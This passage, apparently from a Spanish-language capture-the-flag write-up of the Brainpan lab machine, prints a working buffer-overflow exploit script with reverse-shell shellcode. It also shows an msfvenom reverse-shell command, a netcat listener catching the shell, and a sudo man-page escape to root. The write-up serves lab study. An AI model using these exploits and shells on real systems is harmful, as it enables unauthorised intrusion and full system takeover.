</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x8f\x7a\x8e\x62\x76\xd5\x60\xdc\x20\x8a\x2a\x88</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xb5\xe0\xec\xce\xb9\x2c\x9b\x2e\x0b\x99\xda\x51</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xa4\x4d\xeb\x2a\xd8\xed\x14\xe1\x58\x0d\xf7\x23</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x95\xa6\xae\xa6\x14\xab\x50\x1d\x5a\xd2\xd2\x97</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x23\x21\xca\xd2\x26\x6d\x4c\x0f\x5b\xfe\x39\x2f</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xc8\xff\x6b</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>junk</span> <span class=o>+</span> <span class=n>eip</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x90</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>16</span> <span class=o>+</span> <span class=n>buf</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=s2>&#34;192.168.88.12&#34;</span><span class=p>,</span> <span class=mi>9999</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>Repasando el script:</p><p>Primero se define el offset que es la cantidad de caracteres que ponemos para llegar hasta el eip, en el eip ponemos la dirección del JMP ESP para que salte al ESP. Después del eip ponemos 16 veces &ldquo;\x90&rdquo; y por último el shellcode.</p><p>¿Por qué ponemos <code>\x90</code> antes del shellcode?</p><p>La memoria puede moverse un poco durante la ejecución del programa, así que no sabemos exactamente en qué dirección comenzará el shellcode en el búfer. El NOP-sled es una forma de lidiar con esto.</p><blockquote><p>Un NOP-sled es una secuencia de instrucciones NOP (sin operación) destinadas a &ldquo;deslizar&rdquo; el flujo de ejecución de instrucciones de la CPU a la siguiente dirección de memoria. Dondequiera que la dirección de retorno aterrice en el NOP-sled, se deslizará a lo largo del búfer hasta que alcance el inicio del shellcode</p></blockquote><p>Solo falta ponernos en escucha y ¡ejecutar el script!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; rlwrap nc -nlvp <span class=m>443</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>443</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>192.168.88.5<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>192.168.88.12<span class=o>]</span> <span class=m>49190</span>
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Versi�n 6.1.7601<span class=o>]</span>
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>c<span class=o>)</span> <span class=m>2009</span> Microsoft Corporation. Reservados todos los derechos.
</span></span></code></pre></div><h2 id=escalada-de-privilegios>Escalada de privilegios<a href=#escalada-de-privilegios class=anchor aria-hidden=true>#</a></h2><p>Dentro de la carpeta del directorio personal de puck vemos este archivo</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1># run brainpan.exe if it stops</span>
</span></span><span class=line><span class=cl>lsof -i:9999
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[[</span> <span class=nv>$?</span> -eq <span class=m>1</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span> 
</span></span><span class=line><span class=cl>	<span class=nv>pid</span><span class=o>=</span><span class=sb>`</span>ps aux <span class=p>|</span> grep brainpan.exe <span class=p>|</span> grep -v grep<span class=sb>`</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=o>[[</span> ! -z <span class=nv>$pid</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>		<span class=nb>kill</span> -9 <span class=nv>$pid</span>
</span></span><span class=line><span class=cl>		killall wineserver
</span></span><span class=line><span class=cl>		killall winedevice.exe
</span></span><span class=line><span class=cl>	<span class=k>fi</span>
</span></span><span class=line><span class=cl>	/usr/bin/wine /home/puck/web/bin/brainpan.exe <span class=p>&amp;</span>
</span></span><span class=line><span class=cl><span class=k>fi</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># run SimpleHTTPServer if it stops</span>
</span></span><span class=line><span class=cl>lsof -i:10000
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[[</span> <span class=nv>$?</span> -eq <span class=m>1</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span> 
</span></span><span class=line><span class=cl>	<span class=nv>pid</span><span class=o>=</span><span class=sb>`</span>ps aux <span class=p>|</span> grep SimpleHTTPServer <span class=p>|</span> grep -v grep<span class=sb>`</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=o>[[</span> ! -z <span class=nv>$pid</span> <span class=o>]]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>		<span class=nb>kill</span> -9 <span class=nv>$pid</span>
</span></span><span class=line><span class=cl>	<span class=k>fi</span>
</span></span><span class=line><span class=cl>	<span class=nb>cd</span> /home/puck/web
</span></span><span class=line><span class=cl>	/usr/bin/python -m SimpleHTTPServer <span class=m>10000</span>
</span></span><span class=line><span class=cl><span class=k>fi</span> 
</span></span></code></pre></div><p>Esto es un script en bash esto significa que esto es un linux, así que vamos a cambiar el payload para linux.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; msfvenom -p linux/x86/shell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>192.168.88.5 <span class=nv>LPORT</span><span class=o>=</span><span class=m>443</span> -b <span class=s2>&#34;\x00&#34;</span> -f py shellcode
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>buf</span> <span class=o>=</span>  b<span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>buf</span> <span class=o>+=</span> b<span class=s2>&#34;\xda\xdb\xbf\x5f\xa4\xa1\x30\xd9\x74\x24\xf4\x5a&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>buf</span> <span class=o>+=</span> b<span class=s2>&#34;\x29\xc9\xb1\x12\x31\x7a\x17\x03\x7a\x17\x83\xb5&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>buf</span> <span class=o>+=</span> b<span class=s2>&#34;\x58\x43\xc5\x78\x7a\x73\xc5\x29\x3f\x2f\x60\xcf&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>buf</span> <span class=o>+=</span> b<span class=s2>&#34;\x36\x2e\xc4\xa9\x85\x31\xb6\x6c\xa6\x0d\x74\x0e&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>buf</span> <span class=o>+=</span> b<span class=s2>&#34;\x8f\x08\x7f\x66\xd0\x43\x27\x73\xb8\x91\xd8\x7a&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>buf</span> <span class=o>+=</span> b<span class=s2>&#34;\x83\x1f\x39\xcc\x95\x4f\xeb\x7f\xe9\x73\x82\x9e&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>buf</span> <span class=o>+=</span> b<span class=s2>&#34;\xc0\xf4\xc6\x08\xb5\xdb\x95\xa0\x21\x0b\x75\x52&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>buf</span> <span class=o>+=</span> b<span class=s2>&#34;\xdb\xda\x6a\xc0\x48\x54\x8d\x54\x65\xab\xce&#34;</span>
</span></span></code></pre></div><p>Ahora dentro con <code>sudo -l</code>vemos que podemos ejecutar <code>/home/anansi/bin/anansi_util</code> como root sin contraseña.</p><pre tabindex=0><code>puck@brainpan:/home/puck$ sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
</code></pre><p>Este script tiene 3 opciones</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util         
</span></span><span class=line><span class=cl>Usage: /home/anansi/bin/anansi_util <span class=o>[</span>action<span class=o>]</span>
</span></span><span class=line><span class=cl>Where <span class=o>[</span>action<span class=o>]</span> is one of:
</span></span><span class=line><span class=cl>  - network
</span></span><span class=line><span class=cl>  - proclist
</span></span><span class=line><span class=cl>  - manual <span class=o>[</span>command<span class=o>]</span>
</span></span></code></pre></div><ul><li>Network</li></ul><p>Ejecuta un ifconfig</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util network
</span></span><span class=line><span class=cl>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class=m>16436</span> qdisc noqueue state UNKNOWN 
</span></span><span class=line><span class=cl>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class=line><span class=cl>    inet 127.0.0.1/8 scope host lo
</span></span><span class=line><span class=cl>    inet6 ::1/128 scope host 
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span><span class=line><span class=cl>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class=m>1500</span> qdisc pfifo_fast state UNKNOWN qlen <span class=m>1000</span>
</span></span><span class=line><span class=cl>    link/ether 08:00:27:c3:40:1b brd ff:ff:ff:ff:ff:ff
</span></span><span class=line><span class=cl>    inet 192.168.88.10/24 brd 192.168.88.255 scope global eth0
</span></span><span class=line><span class=cl>    inet6 fe80::a00:27ff:fec3:401b/64 scope link 
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span></code></pre></div><ul><li>Proclist</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util proclist
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>top - 10:15:24 up <span class=m>15</span> min,  <span class=m>0</span> users,  load average: 0.00, 0.00, 0.00
</span></span><span class=line><span class=cl>Tasks:  <span class=m>77</span> total,   <span class=m>1</span> running,  <span class=m>76</span> sleeping,   <span class=m>0</span> stopped,   <span class=m>0</span> zombie
</span></span><span class=line><span class=cl>%Cpu<span class=o>(</span>s<span class=o>)</span>:  0.0 us,  0.1 sy,  0.0 ni, 99.9 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
</span></span><span class=line><span class=cl>KiB Mem:    <span class=m>248936</span> total,   <span class=m>136380</span> used,   <span class=m>112556</span> free,    <span class=m>25352</span> buffers
</span></span><span class=line><span class=cl>KiB Swap:   <span class=m>520188</span> total,        <span class=m>0</span> used,   <span class=m>520188</span> free,    <span class=m>77192</span> cached
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  PID USER      PR  NI  VIRT  RES  SHR S  %CPU %MEM    TIME+  COMMAND           
</span></span><span class=line><span class=cl>    <span class=m>1</span> root      <span class=m>20</span>   <span class=m>0</span>  <span class=m>3492</span> <span class=m>1860</span> <span class=m>1280</span> S   0.0  0.7   0:00.24 init              
</span></span><span class=line><span class=cl>    <span class=m>2</span> root      <span class=m>20</span>   <span class=m>0</span>     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.00 kthreadd          
</span></span><span class=line><span class=cl>    <span class=m>3</span> root      <span class=m>20</span>   <span class=m>0</span>     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.03 ksoftirqd/0       
</span></span><span class=line><span class=cl>    <span class=m>4</span> root      <span class=m>20</span>   <span class=m>0</span>     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.00 kworker/0:0       
</span></span><span class=line><span class=cl>    <span class=m>6</span> root      rt   <span class=m>0</span>     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.00 migration/0       
</span></span><span class=line><span class=cl>    <span class=m>7</span> root      rt   <span class=m>0</span>     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.00 watchdog/0        
</span></span><span class=line><span class=cl>    <span class=m>8</span> root       <span class=m>0</span> -20     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.00 cpuset            
</span></span><span class=line><span class=cl>    <span class=m>9</span> root       <span class=m>0</span> -20     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.00 khelper           
</span></span><span class=line><span class=cl>   <span class=m>10</span> root      <span class=m>20</span>   <span class=m>0</span>     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.00 kdevtmpfs         
</span></span><span class=line><span class=cl>   <span class=m>11</span> root       <span class=m>0</span> -20     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.00 netns             
</span></span><span class=line><span class=cl>   <span class=m>12</span> root      <span class=m>20</span>   <span class=m>0</span>     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.00 sync_supers       
</span></span><span class=line><span class=cl>   <span class=m>13</span> root      <span class=m>20</span>   <span class=m>0</span>     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.00 bdi-default       
</span></span><span class=line><span class=cl>   <span class=m>14</span> root       <span class=m>0</span> -20     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.00 kintegrityd       
</span></span><span class=line><span class=cl>   <span class=m>15</span> root       <span class=m>0</span> -20     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.00 kblockd           
</span></span><span class=line><span class=cl>   <span class=m>16</span> root       <span class=m>0</span> -20     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.00 ata_sff           
</span></span><span class=line><span class=cl>   <span class=m>17</span> root      <span class=m>20</span>   <span class=m>0</span>     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.00 khubd             
</span></span><span class=line><span class=cl>   <span class=m>18</span> root       <span class=m>0</span> -20     <span class=m>0</span>    <span class=m>0</span>    <span class=m>0</span> S   0.0  0.0   0:00.00 md       
</span></span></code></pre></div><ul><li>Manual</li></ul><p>Muestra el manual de un comando</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo /home/anansi/bin/anansi_util manual /bin/bash
</span></span></code></pre></div><p>El manual que muestra parece que es el mismo que man, así que si ponemos lo siguiente dentro del manual, nos convertimos en root</p><pre tabindex=0><code>!/bin/bash
</code></pre><p>Máquina resuelta</p><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="page-nav d-flex flex-column flex-sm-row"><div class="card w-100"><div class="card-body d-flex"><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M5 12l6 6"/><path d="M5 12l6-6"/></svg></div><div class="d-flex flex-column"><div class=text-body-secondary>Prev</div><a href=/writeups/hackthebox/buff/ class="stretched-link text-reset text-decoration-none">Buff</a></div></div></div><div class=m-2></div><div class="card text-end w-100"><div class="card-body d-flex justify-content-end"><div class="d-flex flex-column"><div class=text-body-secondary>Next</div><a href=/writeups/hackthebox/enterprise/ class="stretched-link text-reset text-decoration-none">Enterprise</a></div><div class="d-flex flex-column justify-content-center"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12h14"/><path d="M13 18l6-6"/><path d="M13 6l6 6"/></svg></div></div></div></div></main></div></div></div><footer class="footer text-muted"><div class=container-lg><div class=row><div class="col-lg-8 text-center text-lg-start"><ul class=list-inline><li class=list-inline-item><a class=text-muted href=/tags/>Tags</a></li></ul></div><div class="col-lg-8 text-center text-lg-end"><ul class=list-inline><li class=list-inline-item>Brought to you by <a class=text-muted href=https://gethyas.com/>Hyas</a></li></ul></div></div></div></footer><script async src=/js/app.1e84dcdaa5ccef6fe83f6d88ac1e444a1f237111cfa2a7a97427f758e9c27ef4.js integrity="sha256-HoTc2qXM72/oP22IrB5ESh8jcRHPoqepdCf3WOnCfvQ="></script><script async src=/js/flexsearch.78e4b7a9456a2770bd6faffb1f6488b30db12ca157c3df4e89e3ae2e258888ae.js integrity="sha256-eOS3qUVqJ3C9b6/7H2SIsw2xLKFXw99OieOuLiWIiK4="></script><script async src=/js/search-modal.c4c023efcdee308e4b5f1110afe1db6b1656f217e67aa7efe54e2f4bf2feccf8.js integrity="sha256-xMAj783uMI5LXxEQr+HbaxZW8hfmeqfv5U4vS/L+zPg="></script><div class="d-inline-flex fixed-bottom-right pb-4 pe-4"><button id=toTop type=button class="btn btn-primary rounded-circle ms-auto p-2"><span class=visually-hidden>Top</span><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-up" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 15l6-6 6 6"/></svg></button></div></body></html>